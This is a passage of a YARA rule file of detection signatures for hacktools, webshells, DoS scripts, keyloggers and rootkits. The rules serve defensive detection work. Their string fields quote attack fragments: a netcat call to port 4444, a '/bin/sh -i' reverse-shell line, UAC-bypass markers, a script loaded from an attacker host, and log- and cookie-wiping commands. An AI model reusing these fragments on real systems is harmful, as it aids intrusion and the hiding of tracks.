      $s4 = "System32\\migwiz\\CRYPTBASE.dll" wide
      $s5 = "Elevation:Administrator!new:" wide
      $s6 = "BypassUac" wide
   condition: 
      all of them
} 

rule Hacktools_CN_Burst_Blast_RID306D : CHINA DEMO SUSP T1136 {
   meta:
      description = "Disclosed hacktool set - file Blast.bat"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-17 12:39:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http:" ascii
      $s1 = "@echo off" fullword ascii
   condition: 
      all of them
} 

rule Hacktools_CN_445_cmd_RID2E38 : CHINA DEMO FILE SUSP T1136 {
   meta:
      description = "Disclosed hacktool set - file cmd.bat"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-17 11:05:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $bat = "@echo off" fullword ascii
      $s0 = "cs.exe %1" fullword ascii
      $s2 = "nc %1 4444" fullword ascii
   condition: 
      uint32 ( 0 ) == 0x68636540 and $bat at 0 and all of ( $s* )
} 

rule Hacktools_CN_Burst_pass_RID302E : CHINA DEMO SUSP T1136 {
   meta:
      description = "Disclosed hacktool set - file pass.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-17 12:28:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "123456.com" fullword ascii
      $s1 = "123123.com" fullword ascii
      $s2 = "360.com" fullword ascii
      $s3 = "123.com" fullword ascii
      $s4 = "juso.com" fullword ascii
      $s5 = "sina.com" fullword ascii
      $s7 = "changeme" fullword ascii
      $s8 = "master" fullword ascii
      $s9 = "google.com" fullword ascii
      $s10 = "chinanet" fullword ascii
      $s12 = "lionking" fullword ascii
   condition: 
      all of them
} 

rule Hacktools_CN_Scan_BAT_RID2EC3 : CHINA DEMO SUSP T1136 {
   meta:
      description = "Disclosed hacktool set - file scan.bat"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-17 11:28:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "for /f %%a in (host.txt) do (" fullword ascii
      $s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
      $s2 = "del host.txt /q" fullword ascii
      $s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
      $s4 = "start Http.exe %%a %http%" fullword ascii
      $s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
   condition: 
      5 of them
} 

rule Tzddos_DDoS_Tool_CN_RID2E1F : CHINA DEMO SUSP T1136 {
   meta:
      description = "Disclosed hacktool set - file tzddos"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-17 11:01:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "for /f %%a in (host.txt) do (" fullword ascii
      $s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
      $s2 = "del host.txt /q" fullword ascii
      $s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
      $s4 = "start Http.exe %%a %http%" fullword ascii
      $s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
      $s6 = "del Result.txt s2.txt s1.txt " fullword ascii
   condition: 
      all of them
} 

rule Hacktools_CN_Burst_Thecard_RID3132 : CHINA DEMO SUSP T1057 T1136 {
   meta:
      description = "Disclosed hacktool set - file Thecard.bat"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-17 13:12:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1057, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "tasklist |find \"Clear.bat\"||start Clear.bat" fullword ascii
      $s1 = "Http://www.coffeewl.com" fullword ascii
      $s2 = "ping -n 2 localhost 1>nul 2>nul" fullword ascii
      $s3 = "for /L %%a in (" fullword ascii
      $s4 = "MODE con: COLS=42 lines=5" fullword ascii
   condition: 
      all of them
} 

rule Hacktools_CN_Burst_Clear_RID305E : CHINA DEMO SUSP T1136 {
   meta:
      description = "Disclosed hacktool set - file Clear.bat"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-17 12:36:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "del /f /s /q %systemdrive%\\*.log    " fullword ascii
      $s1 = "del /f /s /q %windir%\\*.bak    " fullword ascii
      $s4 = "del /f /s /q %systemdrive%\\*.chk    " fullword ascii
      $s5 = "del /f /s /q %systemdrive%\\*.tmp    " fullword ascii
      $s8 = "del /f /q %userprofile%\\COOKIES s\\*.*    " fullword ascii
      $s9 = "rd /s /q %windir%\\temp & md %windir%\\temp    " fullword ascii
      $s11 = "del /f /s /q %systemdrive%\\recycled\\*.*    " fullword ascii
      $s12 = "del /f /s /q \"%userprofile%\\Local Settings\\Temp\\*.*\"    " fullword ascii
      $s19 = "del /f /s /q \"%userprofile%\\Local Settings\\Temporary Internet Files\\*.*\"   " ascii
   condition: 
      5 of them
} 

rule Hacktools_CN_Burst_Start_RID3085 : CHINA DEMO SUSP T1136 {
   meta:
      description = "Disclosed hacktool set - file Start.bat - DoS tool"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-17 12:43:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "for /f \"eol= tokens=1,2 delims= \" %%i in (ip.txt) do (" fullword ascii
      $s1 = "Blast.bat /r 600" fullword ascii
      $s2 = "Blast.bat /l Blast.bat" fullword ascii
      $s3 = "Blast.bat /c 600" fullword ascii
      $s4 = "start Clear.bat" fullword ascii
      $s5 = "del Result.txt" fullword ascii
      $s6 = "s syn %%i %%j 3306 /save" fullword ascii
      $s7 = "start Thecard.bat" fullword ascii
      $s10 = "setlocal enabledelayedexpansion" fullword ascii
   condition: 
      5 of them
} 

rule Powershell_Netcat_RID2DF4 : DEMO SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects a Powershell version of the Netcat network hacking tool"
      author = "Florian Roth"
      reference = "-"
      date = "2014-10-10 10:53:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "[ValidateRange(1, 65535)]" fullword
      $s1 = "$Client = New-Object -TypeName System.Net.Sockets.TcpClient" fullword
      $s2 = "$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize" fullword
   condition: 
      all of them
} 

rule Webshell_and_Exploit_CN_APT_HK_RID3243 : APT CHINA DEMO T1100 T1136 WEBSHELL Webshell {
   meta:
      description = "Webshell and Exploit Code in relation with APT against Honk Kong protesters"
      author = "Florian Roth"
      reference = "-"
      date = "2014-10-10 13:57:41"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, T1100, T1136, WEBSHELL, Webshell"
      minimum_yara = "1.7"
      
   strings:
      $a0 = "<script language=javascript src=http://java-se.com/o.js</script>" fullword
      $s0 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">" 
      $s1 = "<input type=\"hidden\" name=\"doing\" value=\"login\">" 
   condition: 
      $a0 or ( all of ( $s* ) )
} 

rule JSP_Browser_APT_webshell_RID303A : APT DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "VonLoesch JSP Browser used as web shell by APT groups - jsp File browser 1.1a"
      author = "Florian Roth"
      reference = "-"
      date = "2014-10-10 12:30:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $a1a = "private static final String[] COMMAND_INTERPRETER = {\"" ascii
      $a1b = "cmd\", \"/C\"}; // Dos,Windows" ascii
      $a2 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" ascii
      $a3 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" ascii
   condition: 
      all of them
} 

rule MAL_DarkComet_Keylogger_File_RID31AB : APT DEMO FILE T1056 {
   meta:
      description = "Looks like a keylogger file created by DarkComet Malware"
      author = "Florian Roth"
      reference = "-"
      date = "2014-07-25 13:32:21"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1056"
      minimum_yara = "2.2.0"
      
   strings:
      $entry = /\n:: [A-Z]/ 
      $timestamp = /\([0-9]?[0-9]:[0-9][0-9]:[0-9][0-9] [AP]M\)/ 
   condition: 
      uint16 ( 0 ) == 0x3A3A and #entry > 10 and #timestamp > 10
} 

rule HKTL_DllInjection_RID2D62 : DEMO HKTL T1055 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file DllInjection.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:29:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1055, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\BDoor\\DllInjecti" 
   condition: 
      all of them
} 

rule HKTL_Mithril_v1_45_Mithril_RID3082 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file Mithril.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:42:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "cress.exe" 
      $s7 = "\\Debug\\Mithril." 
   condition: 
      all of them
} 

rule HKTL_hkshell_hkrmv_RID2E15 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file hkrmv.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:59:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "/THUMBPOSITION7" 
      $s6 = "\\EvilBlade\\" 
   condition: 
      all of them
} 

rule Webshell_FeliksPack3___PHP_Shells_phpft_RID3606 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phpft.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 16:38:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "PHP Files Thief" 
      $s11 = "http://www.4ngel.net" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_indexer_RID2FAE : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file indexer.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input type=\"r" 
   condition: 
      all of them
} 

rule Webshell_r57shell_RID2D9C : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file r57shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:39:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to" 
   condition: 
      all of them
} 

rule HKTL_bdcli100_RID2B32 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file bdcli100.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 08:56:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "unable to connect to " 
      $s8 = "backdoor is corrupted on " 
   condition: 
      all of them
} 

rule HKTL_HYTop2006_rar_Folder_2006X2_RID314F : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2006X2.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 13:17:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "Powered By " 
      $s3 = " \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this." 
   condition: 
      all of them
} 

rule HKTL_rdrbs084_RID2B5C : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file rdrbs084.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:03:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Create mapped port. You have to specify domain when using HTTP type." 
      $s8 = "<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET" 
   condition: 
      all of them
} 

rule Webshell_eBayId_index3_RID2F7E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file index3.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:59:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_phvayv_RID2F5D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phvayv.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "wrap=\"OFF\">XXXX</textarea></font><font face" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_casus15_2_RID2FD5 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file casus15.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:14:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "copy ( $dosya_gonder" 
   condition: 
      all of them
} 

rule Webshell_installer_RID2E74 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file installer.cmd"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:15:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Restore Old Vanquish" 
      $s4 = "ReInstall Vanquish" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_remview_2_RID304F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file remview.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:34:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<xmp>$out</" 
      $s1 = ".mm(\"Eval PHP code\")." 
   condition: 
      all of them
} 

rule Webshell_FeliksPack3___PHP_Shells_r57_RID34C2 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file r57.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 15:44:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']." 
   condition: 
      all of them
} 

rule HKTL_HYTop2006_rar_Folder_2006X_RID311D : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file 2006X.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 13:08:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<input name=\"password\" type=\"password\" id=\"password\"" 
      $s6 = "name=\"theAction\" type=\"text\" id=\"theAction\"" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_phvayv_2_RID2FEE : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file phvayv.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:18:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font" 
   condition: 
      all of them
} 

rule Webshell_elmaliseker_RID2F34 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file elmaliseker.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:47:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "javascript:Command('Download'" 
      $s5 = "zombie_array=array(" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_tool_RID2E7D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file tool.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:16:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "\"\"%windir%\\\\calc.exe\"\")" 
   condition: 
      all of them
} 

rule HKTL_shelltools_g0t_root_Fport_RID32E3 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file Fport.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:24:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "Copyright 2000 by Foundstone, Inc." 
      $s5 = "You must have administrator privileges to run fport - exiting..." 
   condition: 
      all of them
} 

rule Webshell_BackDooR__fr__RID2F80 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file BackDooR (fr).php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:59:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include " 
   condition: 
      all of them
} 

rule Webshell_FSO_s_ntdaddy_RID2FA7 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file ntdaddy.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:06:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"s" 
   condition: 
      all of them
} 

rule Webshell_stview_nstview_RID30B7 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file nstview.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");" 
   condition: 
      all of them
} 

rule Webshell_HYTop_DevPack_upload_RID325B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file upload.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 14:01:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<!-- PageUpload Below -->" 
   condition: 
      all of them
} 

rule HKTL_PasswordReminder_RID2F2C : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file PasswordReminder.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:45:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "The encoded password is found at 0x%8.8lx and has a length of %d." 
   condition: 
      all of them
} 

rule Webshell_FSO_s_RemExp_2_RID2FA1 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file RemExp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 12:05:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = " Then Response.Write \"" 
      $s3 = "<a href= \"<%=Request.ServerVariables(\"script_name\")%>" 
   condition: 
      all of them
} 

rule Webshell_FSO_s_c99_RID2D94 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file c99.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:37:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce" 
   condition: 
      all of them
} 

rule HKTL_dbgntboot_RID2C66 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file dbgntboot.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:47:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp" 
      $s3 = "sth junk the M$ Wind0wZ retur" 
   condition: 
      all of them
} 

rule Webshell_PHP_shell_RID2E05 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:56:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz" 
      $s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s" 
   condition: 
      all of them
} 

rule HKTL_hxdef100_RID2B43 : DEMO HKTL T1050 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file hxdef100.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 08:59:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1050, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "RtlAnsiStringToUnicodeString" 
      $s8 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\" 
      $s9 = "\\\\.\\mailslot\\hxdef-rk100sABCDEFGH" 
   condition: 
      all of them
} 

rule HKTL_rdrbs100_RID2B51 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file rdrbs100.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:01:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "Server address must be IP in A.B.C.D format." 
      $s4 = " mapped ports in the list. Currently " 
   condition: 
      all of them
} 

rule HKTL_hxdef100_2_RID2BD4 : DEMO HKTL T1050 T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file hxdef100.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:23:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1050, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\\\.\\mailslot\\hxdef-rkc000" 
      $s2 = "Shared Components\\On Access Scanner\\BehaviourBlo" 
      $s6 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\" 
   condition: 
      all of them
} 

rule Webshell_webadmin_RID2DED : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file webadmin.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 10:52:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu" 
   condition: 
      all of them
} 

rule Webshell_ASP_commands_RID2F3B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file commands.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 11:48:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID" 
      $s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F" 
   condition: 
      all of them
} 

rule HKTL_hkdoordll_RID2C66 : DEMO HKTL T1100 T1136 WEBSHELL {
   meta:
      description = "Webshells Auto-generated - file hkdoordll.dll"
      author = "Florian Roth"
      reference = "-"
      date = "2014-04-07 09:47:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
